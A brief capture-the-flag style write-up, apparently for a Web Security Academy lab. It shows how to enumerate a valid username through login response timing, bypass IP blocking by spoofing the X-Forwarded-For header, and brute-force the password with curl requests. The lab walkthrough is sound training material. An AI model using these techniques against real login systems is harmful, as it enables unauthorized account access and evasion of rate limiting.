

This time we are focus on time to response
if username is true then check password so need more time to check it
and if my ip blocked use
	"X-Forwarded-For: 85"
header and change value to bypass that

curl -ik -X $'POST' \
    -b $'session=GXbKj35KYIx119PtnVTZyI6mb9xzdxiE' \
    --data-binary $'username=applications&password=peterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeterpeter' \
    $'https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net/login'
	
this request have more response time than other response

so start bruteforce password :

curl -i -s -k -X $'POST' \
    -b $'session=GXbKj35KYIx119PtnVTZyI6mb9xzdxiE' \
    --data-binary $'username=applications&password=123qwe' \
    $'https://0a5200de04e1832585fbc7d2003e009d.web-security-academy.net/login'
	
and we are in ;)
